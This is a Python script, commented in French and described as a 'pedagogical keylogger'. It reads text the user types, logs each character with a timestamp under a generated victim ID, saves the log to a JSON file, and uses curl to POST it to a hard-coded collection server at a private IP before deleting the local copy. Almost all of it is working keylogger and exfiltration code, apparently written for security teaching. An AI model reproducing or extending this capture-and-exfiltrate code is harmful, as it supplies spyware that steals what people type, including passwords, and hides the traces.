#!/usr/bin/env python3
"""
Keylogger pédagogique - MODE SIMPLE (sans pynput)
L'utilisateur tape manuellement, le script le sauvegarde et l'envoie
"""

import json
import uuid
from datetime import datetime
import os
import subprocess

# Configuration
SERVER_URL = "http://192.168.30.129:5000/api/logs"
LOG_FILE = "keylog.json"

# ID unique de la victime
VICTIM_ID = f"victime_{uuid.uuid4()}"
logs = []

def add_key(key_char):
    """Ajoute une touche au journal"""
    entry = {
        "timestamp": datetime.now().isoformat(),
        "key": key_char,
        "type": "char"
    }
    logs.append(entry)
    save_to_file()
    print(f"[CAPTURE] '{key_char}' (Total: {len(logs)} touches)")

def save_to_file():
    """Sauvegarde les logs dans un fichier JSON"""
    data = {
        "victim_id": VICTIM_ID,
        "keys": logs
    }
    
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def send_to_server():
    """Envoie le fichier au serveur via curl"""
    if not os.path.exists(LOG_FILE):
        print(f"[!] Fichier {LOG_FILE} non trouvé")
        return False
    
    if len(logs) == 0:
        print(f"[!] Aucune touche à envoyer")
        return False
    
    print(f"\n[ENVOI] Envoi de {len(logs)} touches au serveur...")
    print(f"[URL] {SERVER_URL}")
    
    # Lire le fichier
    with open(LOG_FILE, "r") as f:
        data = f.read()
    
    # Envoyer via curl
    try:
        result = subprocess.run([
            "curl", "-X", "POST", SERVER_URL,
            "-H", "Content-Type: application/json",
            "-d", data
        ], capture_output=True, text=True, timeout=5)
        
        if result.returncode == 0:
            print(f"[RESPONSE] {result.stdout}")
            print("[✓] Envoi réussi !")
            # Supprimer le fichier après envoi
            os.remove(LOG_FILE)
            print(f"[✓] Fichier {LOG_FILE} supprimé")
            return True
        else:
            print(f"[✗] Erreur d'envoi")
            print(f"[ERROR] {result.stderr}")
            return False
    
    except Exception as e:
        print(f"[✗] Erreur : {e}")
        return False

def main():
    print("[*] ========================================")
    print("[*] Keylogger pédagogique (MODE SIMPLE)")
    print("[*] ========================================")
    print(f"[*] Victime ID : {VICTIM_ID}")
    print(f"[*] Serveur   : {SERVER_URL}")
    print(f"[*] Fichier   : {LOG_FILE}")
    print("[*] ")
    print("[*] COMMANDES :")
    print("[*]   - Tapez du texte et appuyez sur Entrée")
    print("[*]   - Tapez 'send' pour envoyer au serveur")
    print("[*]   - Tapez 'quit' pour quitter")
    print("[*] ")
    print("[*] ========================================\n")
    
    while True:
        try:
            # Lire une ligne
            user_input = input("[INPUT] Tapez quelque chose: ")
            
            if user_input.lower() == "quit":
                print("[!] Arrêt du keylogger...")
                print(f"[!] {len(logs)} touches capturées")
                
                if logs:
                    send_to_server()
                
                print("[!] Au revoir!")
                break
            
            elif user_input.lower() == "send":
                print("[*] Envoi au serveur...")
                send_to_server()
                logs.clear()
                print("[✓] Logs vidés")
            
            else:
                # Ajouter chaque caractère
                for char in user_input:
                    add_key(char)
                # Ajouter un espace
                add_key(" ")
        
        except KeyboardInterrupt:
            print("\n[!] Arrêt du keylogger (Ctrl+C)...")
            print(f"[!] {len(logs)} touches capturées")
            
            if logs:
                send_to_server()
            
            print("[!] Au revoir!")
            break
        
        except Exception as e:
            print(f"[!] Erreur : {e}")

if __name__ == "__main__":
    main() 
